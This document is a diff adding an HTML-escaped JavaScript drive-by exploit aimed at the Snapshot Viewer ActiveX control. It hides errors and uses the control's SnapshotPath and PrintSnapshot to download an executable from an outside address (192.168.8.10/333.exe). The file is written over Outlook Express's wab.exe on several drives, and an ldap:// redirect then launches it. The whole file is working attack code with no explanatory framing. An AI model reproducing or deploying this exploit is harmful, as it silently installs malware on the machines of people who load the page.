@@ -1,0 +1,41 @@
+&lt;script type=&quot;text/javascript&quot;&gt;
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+
+var x;
+var obj;
+var mycars = new Array();
+mycars[0] = &quot;c:/Program Files/Outlook Express/wab.exe&quot;;
+mycars[1] = &quot;d:/Program Files/Outlook Express/wab.exe&quot;;
+mycars[2] = &quot;e:/Program Files/Outlook Express/wab.exe&quot;;
+
+var objlcx = new ActiveXObject(&quot;snpvw.Snapshot Viewer Control.1&quot;);
+
+if(objlcx=&quot;[object]&quot;)
+{
+
+setTimeout(&#039;window.location = &quot;ldap://&quot;&#039;,3000);
+
+for (x in mycars)
+{
+obj = new ActiveXObject(&quot;snpvw.Snapshot Viewer Control.1&quot;)
+
+var buf1 = &#039;http://192.168.8.10/333.exe&#039;;
+var buf2=mycars[x];
+
+obj.Zoom = 0;
+obj.ShowNavigationButtons = false;
+obj.AllowContextMenu = false;
+obj.SnapshotPath = buf1;
+
+try
+{
+   obj.CompressedPath = buf2;
+   obj.PrintSnapshot();
+}catch(e){}
+
+}
+}
+&lt;/script&gt;
